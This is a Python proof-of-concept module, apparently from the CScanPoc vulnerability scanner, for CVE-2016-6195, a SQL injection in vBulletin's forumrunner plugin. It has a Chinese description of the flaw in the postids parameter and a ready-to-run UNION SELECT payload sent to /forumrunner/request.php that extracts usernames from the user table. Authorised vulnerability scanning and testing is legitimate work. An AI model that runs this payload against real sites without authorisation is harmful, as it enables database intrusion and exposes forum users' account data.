# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'vBulletin_0004'  # 平台漏洞编号，留空
    name = 'vBulletin 核心插件 forumrunner SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-11-19'  # 漏洞公布时间
    desc = '''
        vBulletin是美国Internet Brands和vBulletin Solutions公司共同开发的一款开源的商业Web论坛程序。
        漏洞的本质是forumrunner/includes/moderation.php文件中， do_get_spam_data()函数()对参数postids和threadid过滤不严导致SQL注入漏洞，
        VBulletin程序中并不直接使用$_GET等全局变量获取输入数据，而是使用clean_gpc() 和 clean_array_gpc() 函数来过滤输入数据，而这两个函数并未对STRING类型做严格过滤，而传入的参数postids是作为SRING类型解析，参数postids随后拼接在SQL语句中进行查询，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4156/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2016-6195'  # cve编号
    product = 'vBulletin'  # 漏洞应用名称
    product_version = 'forumrunner'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2dd301d6-e588-493a-9b3d-f8aebe64d5d8'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select concat(username, 0x3a, md5(c)) from user),5,1,7,8,9,10--+"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
